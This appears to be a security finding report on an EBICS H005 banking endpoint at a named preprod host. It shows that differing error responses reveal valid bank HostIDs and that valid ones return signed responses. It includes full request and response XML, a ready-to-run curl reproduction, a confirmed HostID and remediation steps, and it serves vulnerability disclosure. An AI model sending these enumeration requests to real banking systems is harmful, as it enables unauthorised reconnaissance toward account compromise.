# F015 - EBICS HostID Enumeration Oracle with Bank Key Exposure

## Summary
The EBICS H005 banking endpoint at ebics.preprod.spiko.io allows unauthenticated enumeration of valid bank HostIDs through differential error responses. Valid HostIDs additionally trigger the server to sign error responses with its authentication RSA private key, leaking cryptographic material.

## Endpoint
POST https://ebics.preprod.spiko.io/ebics

## Severity
Medium

## CVSS
AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N -- 5.3

## OWASP
A05:2021 - Security Misconfiguration (verbose error differentiation on banking protocol endpoint)

## Impact
1. An attacker can enumerate all configured EBICS bank HostIDs by brute force without authentication, rate limiting, or WAF protection.
2. For valid HostIDs, the server returns a different response type (ebicsResponse vs ebicsKeyManagementResponse) and includes a full RSA-SHA256 AuthSignature, exercising the bank's authentication private key on every request.
3. The confirmed HostID "SPIKOPREPROD" is the first element of the EBICS authentication chain. Combined with no rate limiting, PartnerID and UserID enumeration may also be possible with further schema refinement.

## Proof

### Request 1 -- Invalid HostID

```
POST /ebics HTTP/2
Host: ebics.preprod.spiko.io
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<ebicsRequest xmlns="urn:org:ebics:H005" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Version="H005" Revision="1">
  <header authenticate="true">
    <static>
      <HostID>FAKE</HostID>
      <Nonce>a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</Nonce>
      <Timestamp>2026-10-29T20:00:00.000Z</Timestamp>
      <PartnerID>TEST</PartnerID>
      <UserID>TESTUSER</UserID>
      <OrderDetails><AdminOrderType>HTD</AdminOrderType></OrderDetails>
      <BankPubKeyDigests>
        <Authentication Version="X002" Algorithm="http://www.w3.org/2001/04/xmlenc#sha256">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</Authentication>
        <Encryption Version="E002" Algorithm="http://www.w3.org/2001/04/xmlenc#sha256">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</Encryption>
      </BankPubKeyDigests>
      <SecurityMedium>0000</SecurityMedium>
    </static>
    <mutable><TransactionPhase>Initialisation</TransactionPhase></mutable>
  </header>
  <AuthSignature>
    <ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#xpointer(//*[@authenticate='true'])"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue></ds:Reference></ds:SignedInfo>
    <ds:SignatureValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:SignatureValue>
  </AuthSignature>
  <body/>
</ebicsRequest>
```

### Response 1 -- Invalid HostID (HTTP 200)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ebicsKeyManagementResponse xmlns="urn:org:ebics:H005" Version="H005" Revision="1">
  <header authenticate="true">
    <static/>
    <mutable>
      <ReturnCode>091011</ReturnCode>
      <ReportText>[EBICS_INVALID_HOST_ID] Invalid host ID</ReportText>
    </mutable>
  </header>
  <body>
    <ReturnCode authenticate="true">000000</ReturnCode>
  </body>
</ebicsKeyManagementResponse>
```

Note: No AuthSignature. Response type is ebicsKeyManagementResponse. ReturnCode 091011.

### Request 2 -- Valid HostID (same structure, only HostID changed)

```
HostID changed to: SPIKOPREPROD
```

### Response 2 -- Valid HostID (HTTP 200)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ebicsResponse xmlns="urn:org:ebics:H005" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Version="H005" Revision="1">
  <header authenticate="true">
    <static/>
    <mutable>
      <TransactionPhase>Initialisation</TransactionPhase>
      <ReturnCode>091010</ReturnCode>
      <ReportText>[EBICS_INVALID_XML] XML invalid according to schema</ReportText>
    </mutable>
  </header>
  <AuthSignature>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
      <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
      <ds:Reference URI="#xpointer(//*[@authenticate='true'])">
        <ds:Transforms>
          <ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
        </ds:Transforms>
        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <ds:DigestValue>5k7J1BWuj7tPiyznz9Eu7GTy2Gc9ztpmEyWI+10C2zk=</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>Z9OEEStZAsvvLnLNj7lG76Ol2axxzNdRNSjB9YFqX4WSfw6+wSDFsaN2CKZ46XqaUH8Y4Uc0Sp/0ZVbdmbee5+CZB8pq2whxkZniIdqLJ3ftTMqveMPl7bfZMFScfDhZAqOcz1jo7BgxwwjN4GN99oXA8lmrCc/cBn/FjWmpPthhoGjqQs/1cDHzo0Ad/wlj0JxeYF5uSvtforB4V/R6kS6zxq7kM0BMxhx9OZWRXL98f/ZN52FiHYHucQpAlTaFJO4rDXSaguCXmiOD1Kyq68ck8Sa5iLt/+ZoJPFrH1KB4ne6CQlcr7ibapJs/zdh+aiusFhHOYEovN8d2ig/iTQ==</ds:SignatureValue>
  </AuthSignature>
  <body>
    <ReturnCode authenticate="true">000000</ReturnCode>
  </body>
</ebicsResponse>
```

Note: Full AuthSignature present. Response type is ebicsResponse (different wrapper). ReturnCode 091010 (different from 091011). Bank's RSA authentication signature included.

## Differential Indicators
| Indicator | Invalid HostID | Valid HostID |
|-----------|---------------|-------------|
| Response wrapper | ebicsKeyManagementResponse | ebicsResponse |
| ReturnCode | 091011 (INVALID_HOST_ID) | 091010 (INVALID_XML) |
| AuthSignature | Absent | Present (RSA-SHA256) |
| TransactionPhase | Absent | Initialisation |

## Reproduction
```bash
# Invalid HostID - returns 091011
curl -s -X POST https://ebics.preprod.spiko.io/ebics \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><ebicsRequest xmlns="urn:org:ebics:H005" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Version="H005" Revision="1"><header authenticate="true"><static><HostID>FAKE</HostID><Nonce>a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</Nonce><Timestamp>2026-10-29T20:00:00.000Z</Timestamp><PartnerID>TEST</PartnerID><UserID>TESTUSER</UserID><OrderDetails><AdminOrderType>HTD</AdminOrderType></OrderDetails><BankPubKeyDigests><Authentication Version="X002" Algorithm="http://www.w3.org/2001/04/xmlenc#sha256">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</Authentication><Encryption Version="E002" Algorithm="http://www.w3.org/2001/04/xmlenc#sha256">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</Encryption></BankPubKeyDigests><SecurityMedium>0000</SecurityMedium></static><mutable><TransactionPhase>Initialisation</TransactionPhase></mutable></header><AuthSignature><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#xpointer(//*[@authenticate=&apos;true&apos;])"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:SignatureValue></AuthSignature><body/></ebicsRequest>'

# Valid HostID - returns 091010 with signed response
# Same request but change HostID to SPIKOPREPROD
```

## Remediation
1. Return a generic error for both valid and invalid HostIDs when the rest of the request is invalid. Do not differentiate error codes until full authentication is verified.
2. Implement rate limiting on the EBICS endpoint to prevent brute-force enumeration.
3. Consider restricting EBICS endpoint access to known banking partner IP ranges.
